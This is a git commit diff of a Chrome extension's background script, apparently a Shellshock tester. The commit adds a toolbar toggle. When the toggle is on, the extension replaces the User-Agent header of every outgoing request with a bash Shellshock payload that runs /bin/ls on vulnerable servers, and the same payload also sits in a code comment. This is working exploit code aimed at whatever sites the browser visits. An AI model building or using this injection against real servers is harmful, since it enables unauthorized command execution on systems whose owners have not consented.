918e1181f8be209bce44a60a4aacc69f432e662b
wesleyleite <wesleyhenrique@gmail.com>
2015-02-01 15:52:23 -0200

    added icon activated and no activated in browser

--- background.js
+++ background.js
@@ -1,3 +1,17 @@
+function UASHELLSHOCKACTIVE(){
+    var id=localStorage.getItem('UASHS_isactive');
+    if(id=='0') {
+        localStorage.setItem('UASHS_isactive',1);
+        chrome.browserAction.setIcon({path:"icon/noactive_icon.png"});
+    } else { 
+        localStorage.setItem('UASHS_isactive',0);
+        chrome.browserAction.setIcon({path:"icon/active_icon.png"});
+    }
+
+}
+
+chrome.browserAction.onClicked.addListener(UASHELLSHOCKACTIVE);
+
 chrome.webRequest.onBeforeSendHeaders.addListener(
 
     //sUserAgenteString = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";
@@ -9,7 +23,8 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
       console.log(aHeaders);
       aHeaders.forEach(function(header, i) {
         if (header.name == 'User-Agent') {
-          header.value = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";
+            if(localStorage.getItem('UASHS_isactive') == '0')
+                header.value = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";
         }
       });
       return {requestHeaders: aHeaders};
